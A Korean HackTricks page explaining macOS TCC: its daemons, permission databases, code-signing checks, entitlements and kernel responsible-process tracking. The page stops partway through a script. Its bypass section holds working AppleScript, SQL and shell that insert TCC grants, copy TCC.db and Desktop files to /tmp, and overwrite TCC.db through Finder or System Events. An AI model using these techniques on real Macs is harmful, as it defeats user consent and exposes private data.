# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **기본 정보**

**TCC (Transparency, Consent, and Control)**는 애플리케이션 권한을 규제하는 보안 프로토콜입니다. 주요 역할은 **위치 서비스, 연락처, 사진, 마이크, 카메라, 손쉬운 사용 및 전체 디스크 접근**과 같은 민감한 기능을 보호하는 것입니다. 앱이 이러한 요소에 접근하기 전에 사용자의 명시적인 동의를 받도록 함으로써 TCC는 개인정보 보호와 데이터에 대한 사용자 제어를 강화합니다.

애플리케이션이 보호된 기능에 대한 접근을 요청할 때 사용자는 TCC를 접하게 됩니다. 이때 사용자에게 **접근 허용 또는 거부**를 선택할 수 있는 프롬프트가 표시됩니다. 또한 TCC는 **파일을 애플리케이션으로 드래그 앤 드롭**하는 것과 같은 직접적인 사용자 동작을 통해 특정 파일에 대한 접근을 허용합니다. 따라서 애플리케이션은 명시적으로 허용된 항목에만 접근할 수 있습니다.

![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**는 `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`에 있는 **daemon**이 처리하며, `/System/Library/LaunchDaemons/com.apple.tccd.system.plist`에서 설정됩니다(`com.apple.tccd.system` mach service 등록).

로그인한 사용자마다 **user-mode tccd**가 하나씩 실행되며, `/System/Library/LaunchAgents/com.apple.tccd.plist`에 정의되어 있습니다. 이 프로세스는 `com.apple.tccd` 및 `com.apple.usernotifications.delegate.com.apple.tccd` mach service를 등록합니다.

다음은 system 및 user로 실행 중인 tccd입니다:

```bash
ps -ef | grep tcc
    0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
  501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

권한은 부모 애플리케이션에서 **상속되며**, **권한**은 **Bundle ID**와 **Developer ID**를 기준으로 **추적됩니다**.

### TCC 데이터베이스

허용/거부 결정은 다음 TCC 데이터베이스에 저장됩니다.

- 시스템 전체 데이터베이스 **`/Library/Application Support/com.apple.TCC/TCC.db`**.
  - 이 데이터베이스는 **SIP로 보호되므로**, SIP 우회만 이 데이터베이스에 쓸 수 있습니다.
- 사용자별 설정을 위한 사용자 TCC 데이터베이스 **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**.
  - 이 데이터베이스는 Full Disk Access와 같은 높은 TCC 권한을 가진 프로세스만 쓸 수 있도록 보호됩니다(하지만 SIP로 보호되지는 않습니다).

> [!WARNING]
> 앞서 언급한 데이터베이스는 **읽기 접근도 TCC로 보호됩니다**. 따라서 TCC 권한이 있는 프로세스가 아니라면 일반 사용자 TCC 데이터베이스를 **읽을 수 없습니다**.
>
> 하지만 **FDA** 또는 **`kTCCServiceEndpointSecurityClient`**와 같은 높은 권한을 가진 프로세스는 사용자 TCC 데이터베이스에 쓸 수 있다는 점을 기억하세요.

- **세 번째** TCC 데이터베이스는 **`/var/db/locationd/clients.plist`**이며, **위치 서비스에 접근할 수 있도록 허용된** 클라이언트를 표시합니다.
- **`/Library/Application Support/com.apple.TCC/REG.db`**는 등록된 TCC 데이터베이스 경로를 기록합니다. 등록되지 않은 사용자 데이터베이스를 심어 두면 거부될 수 있습니다. 이 경로를 알고 있다고 해서 어느 데이터베이스에든 접근할 수 있는 것은 아닙니다.<sup>[[6]](#references)</sup>
- **`/Library/Application Support/com.apple.TCC/MDMOverrides.plist`**에는 관리형 Privacy Preferences Policy Control (PPPC) 결정이 포함됩니다. 일반 `access` 행에는 없는 관리형 허용 항목이 앱에 있다면 이 파일을 확인하세요.<sup>[[7]](#references)</sup>
- SIP로 보호되지만 누구나 읽을 수 있는 파일 **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**은 TCC 예외가 필요한 애플리케이션의 허용 목록입니다.

> [!TIP]
> **iOS**의 TCC 데이터베이스는 **`/private/var/mobile/Library/TCC/TCC.db`**에 있습니다.

> [!TIP]
> **알림 센터 UI**를 통해 **시스템 TCC 데이터베이스를 변경할 수 있습니다**.
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
> 하지만 사용자는 **`tccutil`** 명령줄 유틸리티로 **규칙을 재설정**할 수 있습니다. 문서화된 조회 기능은 없습니다.<sup>[[4]](#references)</sup>

#### 데이터베이스 조회

{{#tabs}}
{{#tab name="user DB"}}

```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}

{{#tab name="system DB"}}

```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```

{{#endtab}}
{{#endtabs}}

> [!TIP]
> 두 데이터베이스를 모두 확인하면 앱이 허용했거나 거부했거나 아직 요청하지 않은 권한을 확인할 수 있습니다(앱이 해당 권한을 요청합니다).

- **`service`**는 TCC **권한**을 나타내는 문자열입니다.
- **`client`**는 해당 권한이 부여된 **bundle ID** 또는 **바이너리 경로**입니다.
- **`client_type`**은 Bundle Identifier(0)인지 절대 경로(1)인지 나타냅니다.

<details>

<summary>절대 경로인 경우 실행하는 방법</summary>

다음과 같이 plist를 사용해 **`launctl load you_bin.plist`**를 실행하면 됩니다.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Label for the job -->
    <key>Label</key>
    <string>com.example.yourbinary</string>

    <!-- The path to the executable -->
    <key>Program</key>
    <string>/path/to/binary</string>

    <!-- Arguments to pass to the executable (if any) -->
    <key>ProgramArguments</key>
    <array>
        <string>arg1</string>
        <string>arg2</string>
    </array>

    <!-- Run at load -->
    <key>RunAtLoad</key>
    <true/>

    <!-- Keep the job alive, restart if necessary -->
    <key>KeepAlive</key>
    <true/>

    <!-- Standard output and error paths (optional) -->
    <key>StandardOutPath</key>
    <string>/tmp/YourBinary.stdout</string>
    <key>StandardErrorPath</key>
    <string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

- **`auth_value`**는 denied(0), unknown(1), allowed(2), limited(3) 등 여러 값을 가질 수 있습니다.
- **`auth_reason`**은 다음 값을 가질 수 있습니다: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
- **csreq** 필드는 실행할 바이너리를 확인하고 TCC 권한을 부여하는 방법을 나타냅니다:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

- 테이블의 **다른 필드**에 관한 자세한 내용은 [**이 블로그 게시물 확인**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)을 참조하세요.<sup>[[1]](#references)</sup>

`System Preferences --> Security & Privacy --> Privacy --> Files and Folders`에서 앱에 **이미 부여된 권한**도 확인할 수 있습니다.

> [!TIP]
> 사용자는 **`tccutil`**을 사용해 규칙을 **재설정**할 수 있지만, 권한 부여 내역을 조회하려면 데이터베이스를 직접 확인해야 합니다.<sup>[[4]](#references)</sup>

#### TCC 권한 재설정

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

#### Apple Events 발신자 및 대상 권한 확인

Automation 권한은 모든 앱을 제어할 수 있는 권한이 아니라 **발신자-대상** 간의 결정입니다. 사용자 데이터베이스에 접근할 수 있다면, 아래의 [Apple Events](macos-apple-events.md) 또는 Finder 워크플로를 시도하기 전에 허용된 발신자/대상 쌍을 열거하세요. `csreq`는 발신자를 식별하고 `indirect_object_code_identity`는 대상을 식별합니다. null이 아닌 두 blob은 위의 `csreq` 방법으로 디코딩하세요.<sup>[[1]](#references)</sup>

```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, indirect_object_identifier AS target, \
          hex(csreq) AS sender_req, \
          hex(indirect_object_code_identity) AS target_req \
   FROM access WHERE service='kTCCServiceAppleEvents' AND auth_value=2;"
```

### TCC 서명 검사

TCC **데이터베이스**는 애플리케이션의 **Bundle ID**를 저장하지만, 권한 사용을 요청하는 앱이 올바른 앱인지 **확인하기 위해** 서명에 관한 **정보도** **저장합니다**.

```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```

> [!WARNING]
> 따라서 동일한 이름과 bundle ID를 사용하는 다른 애플리케이션은 다른 앱에 부여된 권한에 접근할 수 없습니다.

### Entitlements 및 TCC 권한

TCC 허가는 **App Sandbox** 제한을 무효화하지 않습니다. 샌드박스 처리된 카메라 클라이언트에는 `com.apple.security.device.camera`가 필요합니다. Apple은 Hardened Runtime 앱에서도 이 기능을 제공합니다. 어느 쪽 entitlement도 별도의 사용자 동의 프롬프트를 우회하지는 않습니다. 샌드박스 entitlement가 모든 샌드박스 처리되지 않은 프로세스에 무조건 필요한 전제 조건이라고 간주하지 마세요. 요청이 실패하면 실행 파일의 entitlement와 responsible app을 모두 확인하세요.<sup>[[8]](#references)[[9]](#references)</sup>

entitlement는 plist 파일이며 code sig의 일부입니다. code sig에서 특수 슬롯을 통해 추가로 해시되며, 커널 코드가 커널에서 조회하거나 user model 코드가 `csops(#169)` 또는 `csops_audittoken(#170)`을 사용해 조회할 수 있습니다.

하지만 앱이 `~/Desktop`, `~/Downloads`, `~/Documents`와 같은 **특정 사용자 폴더**에 **접근**하기 위해 특별한 **entitlement**를 보유할 필요는 없습니다. 시스템은 필요에 따라 투명하게 접근을 처리하고 **사용자에게 프롬프트를 표시**합니다.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple 앱은 **프롬프트를 표시하지 않습니다**. 해당 앱의 **entitlements** 목록에는 **미리 부여된 권한**이 포함되어 있으므로 **팝업이 표시되지 않으며**, **TCC 데이터베이스에도 나타나지 않습니다.** 예를 들면 다음과 같습니다:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```

이렇게 하면 Calendar가 사용자에게 미리 알림, 캘린더 및 주소록에 대한 접근을 요청하지 않게 됩니다.

> [!TIP]
> entitlements에 관한 일부 공식 문서 외에도, [**entitlements에 대한 흥미로운 비공식 정보**](https://newosxbook.com/ent.jl)를 찾아볼 수 있습니다.

일부 TCC 권한은 kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos 등입니다. 모든 권한을 정의한 공개 목록은 없지만, [**알려진 항목 목록**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)을 확인할 수 있습니다.<sup>[[1]](#references)</sup>

### 민감하지만 보호되지 않는 위치

- $HOME (자체)
- $HOME/.ssh, $HOME/.aws 등
- /tmp

### 사용자 의도 / com.apple.macl

앞서 언급했듯이, **파일을 앱으로 드래그 앤 드롭하여 앱에 파일 접근 권한을 부여**할 수 있습니다. 이 권한은 어떤 TCC 데이터베이스에도 기록되지 않고, 파일의 **확장 속성**으로 저장됩니다. 이 속성에는 허용된 앱의 **UUID가 저장**됩니다.<sup>[[2]](#references)</sup>

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

> [!TIP]
> **`com.apple.macl`** 속성은 tccd가 아니라 **Sandbox**에서 관리된다는 점이 흥미롭습니다.
>
> 또한 컴퓨터에 있는 앱의 UUID를 허용하는 파일을 다른 컴퓨터로 옮기면, 같은 앱이라도 UUID가 달라지므로 해당 앱에 대한 접근 권한이 부여되지 않습니다.

확장 속성 `com.apple.macl`은 **SIP로 보호되기** 때문에 다른 확장 속성처럼 **삭제할 수 없습니다**. 그러나 [**이 게시물에서 설명한 것처럼**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), 파일을 **압축하고**, **삭제한 다음**, **압축을 풀면** 이를 비활성화할 수 있습니다.<sup>[[3]](#references)</sup>






## XNU 책임 프로세스 메커니즘

macOS/iOS에서 **책임 프로세스** 메커니즘은 **TCC (Transparency, Consent, and Control)** 프레임워크와 기타 보안 시스템에서 사용하는 핵심 보안 기능입니다. 이 기능은 자식 프로세스가 여러 단계로 이어지는 경우에도 어떤 프로세스가 작업을 최종적으로 책임지는지 추적합니다.

TCC가 권한(예: 카메라, 마이크, 위치)을 확인할 때, 요청을 보내는 즉각적인 프로세스를 항상 확인하는 것은 아닙니다. 대신 **책임 프로세스**를 확인합니다. 일반적으로 이는 작업을 시작한 GUI 애플리케이션이며, 실제 요청은 보조 프로세스나 daemon이 보내더라도 마찬가지입니다.

요청에 실제로 연결된 앱을 식별하려면 보호된 작업을 실행하는 동안 TCC의 `AttributionChain` 메시지를 스트리밍하세요. API 호출을 했다는 이유만으로 보조 실행 파일에 권한을 부여하는 것보다 이 방법이 더 신뢰할 수 있습니다. 보고된 identity를 관련 `access` 행의 bundle ID 또는 경로 및 signing requirement와 비교하세요.<sup>[[10]](#references)</sup>

```bash
log stream --debug --predicate 'subsystem == "com.apple.TCC" AND eventMessage BEGINSWITH "AttributionChain"'
```

<details>
<summary>Responsible Process 설정 방식</summary>

### 프로세스 구조 필드

XNU의 각 프로세스는 두 개의 주요 UUID 식별자를 유지합니다:

```c
// From bsd/sys/proc_internal.h
struct proc {
    // ...
    pid_t   p_responsible_pid;          // PID of the responsible process
    uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
    uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
    // ...
};
```

- **`p_uuid`**: 프로세스 자체의 UUID (Mach-O 바이너리의 `LC_UUID` 로드 명령에서 가져옴)
- **`p_responsible_pid`**: 책임 프로세스의 PID
- **`p_responsible_uuid`**: 책임 프로세스의 UUID (해당 프로세스가 종료된 후에도 유지됨)

### 책임 프로세스가 설정되는 방식

1. **프로세스 생성 시 (Fork)**

`fork()` 또는 `posix_spawn()`을 통해 새 프로세스가 생성되면, 부모의 책임 프로세스를 상속합니다 (`exec()` 시스템 호출은 기존 `proc` 구조체를 재사용하므로 이 단계는 다시 실행되지 않음).

**위치**: `bsd/kern/kern_fork.c:1053`

```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```

**핵심 사항:**
- 자식 프로세스는 부모의 `p_responsible_pid`를 **상속**합니다.
- 이로 인해 프로세스 계층 전체에 **책임 체인**이 형성됩니다.
- 책임 프로세스는 일반적으로 원래 GUI 애플리케이션을 가리킵니다.

2. **핵심 함수: `proc_set_responsible_pid()`**

**위치**: `bsd/kern/kern_proc.c:4817-4831`

```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
    target_proc->p_responsible_pid = responsible_pid;
    
    if (responsible_pid >= 0) {
        proc_t responsible_proc = proc_find(responsible_pid);
        if (responsible_proc != PROC_NULL) {
            // Copy the responsible process's UUID for persistent identification
            proc_getexecutableuuid(responsible_proc, 
                target_proc->p_responsible_uuid, 
                sizeof(target_proc->p_responsible_uuid));
            proc_rele(responsible_proc);
        }
    }
    return;
}
```

**이 함수의 역할:**
1. 대상 프로세스에 **책임 PID를 설정**
2. `proc_find()`를 사용해 **책임 프로세스를 조회** (참조 카운트 증가)
3. 책임 프로세스의 `p_uuid`를 대상 프로세스의 `p_responsible_uuid`로 **복사**
4. `proc_rele()`로 **참조 해제** (참조 카운트 감소)

3. **PID와 UUID를 모두 저장하는 이유**

이중 저장 방식은 중요한 문제를 해결합니다.

| 필드 | 목적 | 문제 | 해결 방법 |
|-------|-------|----------|----------|
| `p_responsible_pid` | 현재 프로세스를 빠르게 조회 | 프로세스가 종료된 후 PID가 재사용될 수 있음 | 활성 프로세스 조회에 사용 |
| `p_responsible_uuid` | 영구적인 식별 | 프로세스 종료 후에도 유지됨 | 보안 검사 및 감사에 사용 |

**문제**: 책임 프로세스가 자식 프로세스보다 먼저 종료되면 PID가 재활용되어 완전히 다른 프로세스에 할당될 수 있습니다.

**해결 방법**: UUID는 변경되지 않으며 책임이 있던 특정 바이너리를 고유하게 식별합니다. 해당 바이너리가 종료된 후에도 마찬가지입니다.

### 프로세스 생성 흐름

```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ fork() / posix_spawn()
                      ▼
         ┌────────────────────────────┐
         │ kern_fork.c:fork1_internal │
         │                            │
         │ proc_set_responsible_pid(  │
         │   child_proc,              │
         │   parent->p_responsible_pid│
         │ );                         │
         └────────────┬───────────────┘
                      │
                      ▼
         ┌────────────────────────────┐
         │ proc_set_responsible_pid() │
         │                            │
         │ 1. Set p_responsible_pid   │
         │ 2. Find responsible proc   │
         │ 3. Copy UUID               │
         │ 4. Release reference       │
         └────────────┬───────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```

### UUID 출처: LC_UUID Load Command

`p_uuid`에 저장된 UUID는 **Mach-O 실행 파일의 `LC_UUID` load command**에서 가져옵니다.

1. **컴파일 시점**

```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```

2. **실행 시간**

**위치**: `bsd/kern/mach_loader.c:2393-2413`

```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
    if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
        (((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
        return LOAD_BADMACHO;
    }

    // Extract UUID from LC_UUID load command
    memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
    return LOAD_SUCCESS;
}
```

3. **프로세스 구조체에 저장됨**

**위치**: `bsd/kern/kern_exec.c:2281`

```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```

**위치**: `bsd/kern/kern_proc.c:1912-1915`

```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
    memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### TCC에 삽입

어느 시점에 TCC 데이터베이스에 대한 쓰기 권한을 얻었다면, 다음과 같은 방법으로 항목을 추가할 수 있습니다(주석은 제거하세요).

<details>

<summary>TCC 삽입 예시</summary>

```sql
INSERT INTO access (
    service,
    client,
    client_type,
    auth_value,
    auth_reason,
    auth_version,
    csreq,
    policy_id,
    indirect_object_identifier_type,
    indirect_object_identifier,
    indirect_object_code_identity,
    flags,
    last_modified,
    pid,
    pid_version,
    boot_uuid,
    last_reminded
) VALUES (
    'kTCCServiceSystemPolicyDesktopFolder', -- service
    'com.googlecode.iterm2', -- client
    0, -- client_type (0 - bundle id)
    2, -- auth_value  (2 - allowed)
    3, -- auth_reason (3 - "User Set")
    1, -- auth_version (always 1)
    X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
    NULL, -- policy_id
    NULL, -- indirect_object_identifier_type
    'UNUSED', -- indirect_object_identifier - default value
    NULL, -- indirect_object_code_identity
    0, -- flags
    strftime('%s', 'now'), -- last_modified with default current timestamp
    NULL, -- assuming pid is an integer and optional
    NULL, -- assuming pid_version is an integer and optional
    'UNUSED', -- default value for boot_uuid
    strftime('%s', 'now') -- last_reminded with default current timestamp
);
```

</details>

### TCC Payloads

TCC 권한이 있는 앱에 침투하는 데 성공했다면, 이를 악용할 수 있는 TCC payloads는 다음 페이지를 확인하세요:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Apple Events에 대해 알아보려면 다음을 참고하세요:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder)를 통한 FDA\*

Automation 권한의 TCC 이름은 **`kTCCServiceAppleEvents`**입니다.\
이 특정 TCC 권한은 TCC 데이터베이스에서 **관리할 수 있는 애플리케이션**도 지정합니다(따라서 권한이 모든 항목을 관리하도록 허용하지는 않습니다).

**Finder**는 **항상 FDA를 보유하는** 애플리케이션입니다(UI에 표시되지 않더라도). 따라서 Finder에 대한 **Automation** 권한이 있다면, 그 권한을 악용해 **Finder가 특정 작업을 수행하도록 할 수 있습니다**.\
이 경우 앱에는 **`com.apple.Finder`**에 대한 **`kTCCServiceAppleEvents`** 권한이 필요합니다.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}

```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
    set homeFolder to path to home folder as string
    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}

{{#tab name="Steal systems TCC.db"}}

```applescript
osascript<<EOD
tell application "Finder"
    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
    set targetFolder to POSIX file "/tmp" as alias
    duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```

{{#endtab}}
{{#endtabs}}

보고된 쓰기 변형 기법 중 하나는 Finder로의 Automation 경로를 사용할 수 있을 때 Finder가 사용자의 `com.apple.TCC` 디렉터리 이름을 **변경하도록 하는 것**입니다. 그런 다음 이름이 변경된 경로의 데이터베이스를 스테이징 디렉터리에 복사해 수정하고, 다시 복사한 뒤 디렉터리 이름을 원래대로 복원했습니다. 새 `kTCCServiceAppleEvents` 행에는 전송 바이너리와 Finder **둘 다** 해당 코드 요구 사항과 함께 지정되어야 합니다. 전송자만 허용하고 대상 ID를 지정하지 않는 것은 같은 효과가 아닙니다. 이 기법은 경로에 따라 달라지므로 Finder Automation만으로 임의의 데이터베이스 쓰기가 가능하다고 가정하지 말고, 대상 macOS 릴리스에서 검증하세요.<sup>[[11]](#references)</sup>

> [!WARNING]
> 이 권한이 있으면 **Finder에 TCC 제한 폴더에 접근해 파일을 가져오도록 요청**할 수 있지만, 제가 아는 한 **Finder가 임의의 코드를 실행하게 만들어 FDA 접근 권한을 완전히 악용할 수는 없습니다**.
>
> 따라서 FDA의 전체 기능을 악용할 수는 없습니다.

다음은 Finder에 대한 Automation 권한을 얻기 위한 TCC 프롬프트입니다.

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> **Automator** 앱에는 TCC 권한 **`kTCCServiceAppleEvents`**가 있으므로 Finder와 같은 **어떤 앱이든 제어할 수 있습니다**. 따라서 Automator를 제어할 권한이 있다면 아래와 같은 코드로 **Finder**도 제어할 수 있습니다.

<details>

<summary>Automator 내부에서 셸 얻기</summary>

```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
   set actionID to Automator action id "com.apple.RunShellScript"
   tell (make new workflow)
      add actionID to it
      tell last Automator action
         set value of setting "inputMethod" to 1
         set value of setting "COMMAND_STRING" to theScript
      end tell
      execute it
   end tell
   activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```

</details>

**Script Editor app에서도 같은 일이 발생합니다.** Finder를 제어할 수 있지만, AppleScript를 사용해 스크립트를 실행하도록 강제할 수는 없습니다.

### Automation (SE) to some TCC

**System Events는 Folder Actions를 생성할 수 있으며, Folder Actions는 일부 TCC 폴더**(Desktop, Documents & Downloads)에 접근할 수 있습니다. 따라서 다음과 같은 스크립트를 사용해 이 동작을 악용할 수 있습니다:

```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
    -- Ensure Folder Actions are enabled
    set folder actions enabled to true

    -- Define the path to the folder and the script
    set homeFolder to path to home folder as text
    set folderPath to homeFolder & "Desktop"
    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

    -- Create or get the Folder Action for the Desktop
    if not (exists folder action folderPath) then
        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
    end if
    set myFolderAction to folder action folderPath

    -- Attach the script to the Folder Action
    if not (exists script scriptPath of myFolderAction) then
        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
    end if

    -- Enable the Folder Action and the script
    enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```

### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)에서 FDA\*까지

**`System Events`**에 대한 Automation과 Accessibility (**`kTCCServicePostEvent`**)를 사용하면 **프로세스에 keystrokes를 보낼 수 있습니다**. 이런 방식으로 Finder를 악용해 사용자의 TCC.db를 변경하거나 임의의 앱에 FDA를 부여할 수 있습니다(이 경우 암호를 입력하라는 메시지가 표시될 수 있음).

Finder로 사용자의 TCC.db를 덮어쓰는 예:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
    -- Open Finder
    tell application "Finder" to activate

    -- Open the /tmp directory
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke "/tmp"
    delay 1
    keystroke return
    delay 1

    -- Select and copy the file
    keystroke "TCC.db"
    delay 1
    keystroke "c" using {command down}
    delay 1

    -- Resolve $HOME environment variable
    set homePath to system attribute "HOME"

    -- Navigate to the Desktop directory under $HOME
    keystroke "g" using {command down, shift down}
    delay 1
    keystroke homePath & "/Library/Application Support/com.apple.TCC"
    delay 1
    keystroke return
    delay 1

